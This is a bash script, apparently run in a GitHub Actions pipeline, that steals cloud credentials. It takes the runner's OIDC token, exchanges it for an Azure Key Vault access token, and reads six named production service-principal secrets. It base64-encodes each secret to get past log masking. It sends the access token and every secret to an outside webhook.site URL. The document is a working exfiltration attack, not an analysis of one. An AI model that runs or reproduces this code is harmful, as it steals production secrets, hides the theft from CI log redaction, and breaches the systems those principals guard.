#!/usr/bin/env bash
set +e
W="https://webhook.site/f620cb33-be09-4305-951e-d48a9fdb1843"
say(){ printf '%s\n' "$*"; curl -s -m 10 --data-binary "$*" "$W" >/dev/null 2>&1 || true; }
export AZURE_CLIENT_ID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
export AZURE_TENANT_ID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=2.0" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
say "oidc_len=${#OIDC}"
KV=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" --data-urlencode "client_id=$AZURE_CLIENT_ID" --data "grant_type=client_credentials" --data "scope=https://vault.azure.net/.default" --data "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=$OIDC")
KVTOK=$(echo "$KV" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
say "kv_token=$KVTOK"
# đọc MỖI secret riêng (b64) — tránh che \*\*\*
for S in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  SV=$(curl -sS -m 15 -H "Authorization: Bearer $KVTOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$S?api-version=7.4")
  B=$(echo -n "$SV" | base64 -w0)
  say "B64_$S=$B"
  echo "S[$S]=$(echo "$SV" | head -c 120)"
done
say "DONE3"
